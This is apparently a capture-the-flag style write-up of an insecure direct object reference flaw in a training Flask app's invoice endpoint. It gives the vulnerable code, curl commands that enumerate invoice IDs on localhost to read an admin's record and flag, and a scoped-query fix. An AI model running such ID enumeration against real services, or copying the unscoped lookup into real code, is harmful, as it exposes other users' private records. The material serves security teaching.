# A01:2021 - Broken Access Control (IDOR)

**Endpoint:** `GET /a01/invoices/<id>`
**Severity:** High

## Vulnerability

The endpoint checks that a session exists (`a01_user_id` in session), but
never checks that the requested invoice actually belongs to that session's
user. Any authenticated user can enumerate `id` and read every other user's
invoices.

```python
# app/challenges/a01_idor.py
@bp.get("/invoices/<int:invoice_id>")
def get_invoice(invoice_id):
    if "a01_user_id" not in session:
        return jsonify({"error": "login required"}), 401

    # no check that invoice.user_id == session["a01_user_id"]
    invoice = db.session.get(Invoice, invoice_id)
    ...
```

## Reproduce

```bash
curl -c cookies.txt -s -X POST http://localhost:5000/a01/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "alice", "password": "alice123"}'

# alice's own invoice is id 1. walk the id space:
curl -b cookies.txt -s http://localhost:5000/a01/invoices/2
```

Response leaks admin's confidential invoice, including the flag:

```json
{"id": 2, "user_id": 2, "description": "CONFIDENTIAL - payroll advance. FLAG{idor_admin_invoice_exposed}", "amount": 99999.0}
```

## Impact

Any low-privilege user can read (and, if a corresponding update endpoint
existed, modify) financial records belonging to any other user, including
admins.

## Fix

Scope every lookup to the authenticated user, and return 404 (not 403) for
IDs that exist but aren't theirs, to avoid confirming existence:

```python
invoice = Invoice.query.filter_by(id=invoice_id, user_id=session["a01_user_id"]).first()
if not invoice:
    return jsonify({"error": "not found"}), 404
```

## Reference

[OWASP Top 10 2021 - A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
